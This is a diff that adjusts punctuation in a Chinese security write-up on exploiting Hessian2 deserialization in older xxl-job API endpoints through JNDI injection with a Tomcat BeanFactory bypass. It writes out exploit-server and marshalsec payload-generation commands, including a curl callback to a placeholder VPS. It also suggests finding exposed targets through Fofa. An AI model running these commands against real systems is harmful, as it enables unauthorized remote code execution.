@@ -11,11 +11,11 @@ tags:
 
 ## 前言
 
-​ 最新版有师傅已经给出 POC, 配置执行器，新建任务对关联服务器执行 `shell` 命令，但是比较蛋疼的是可能关联服务在内网，无法直接从公网攻击.
+​ 最新版有师傅已经给出 POC, 配置执行器，新建任务对关联服务器执行 `shell` 命令，但是比较蛋疼的是可能关联服务在内网，无法直接从公网攻击。
 
 ​ 链接：[https://github.com/jas502n/xxl-job](https://github.com/jas502n/xxl-job)
 
-**本文主要针对 xxl-job 低版本 api 接口存在 Hessian2 反序列化，可以直接攻击调度中心.**
+**本文主要针对 xxl-job 低版本 api 接口存在 Hessian2 反序列化，可以直接攻击调度中心。**
 
 ## 测试环境
 
@@ -43,11 +43,11 @@ Linux
 
 参考：[https://www.veracode.com/blog/research/exploiting-jndi-injections-java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
 
-在测试时候总需要一个比较稳定的 POC，高版本 JDK 对 JNDI 注入进行限制即限制远程类加载，表现在如 RMI/LDAP 服务收到请求，HTTP 服务无响应.
+在测试时候总需要一个比较稳定的 POC，高版本 JDK 对 JNDI 注入进行限制即限制远程类加载，表现在如 RMI/LDAP 服务收到请求，HTTP 服务无响应。
 
-绕过的思路是：在 CLASSPATH 中找到工厂类，对引用的 Reference 属性添加危险方法或属性，该危险方法也需要在 CLASSPATH 中存在.
+绕过的思路是：在 CLASSPATH 中找到工厂类，对引用的 Reference 属性添加危险方法或属性，该危险方法也需要在 CLASSPATH 中存在。
 
-原文作者利用 Apache Tomcat 中的 `org.apache.naming.factory.BeanFactory` 类，结合 `javax.el.ELProcessor` 执行任意代码。赶巧的是 `xxl-job` 基于 `Spring` 框架，底层是利用 `tomcat` 服务器.
+原文作者利用 Apache Tomcat 中的 `org.apache.naming.factory.BeanFactory` 类，结合 `javax.el.ELProcessor` 执行任意代码。赶巧的是 `xxl-job` 基于 `Spring` 框架，底层是利用 `tomcat` 服务器。
 
 [![](assets/1711445954-f5d93ea210fb5c62c3ed636cb95d8462.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201029030207-1369fd66-1950-1.png)
 
@@ -61,11 +61,11 @@ Linux
 # 启动服务
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C "curl vps:8817"
 
-# 生成payload
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor [rmi服务] > ~/Desktop/test13.ser
+# 生成 payload
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor [rmi 服务] > ~/Desktop/test13.ser
 ```
 
-Fofa 上找个 xxl-job, 具体指纹访问 api 会有如下报错.
+Fofa 上找个 xxl-job, 具体指纹访问 api 会有如下报错。
 
 [![](assets/1711445954-b4a3bb3cdc5d1950c433ff67bd333450.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201029025728-6d19d846-194f-1.png)
 
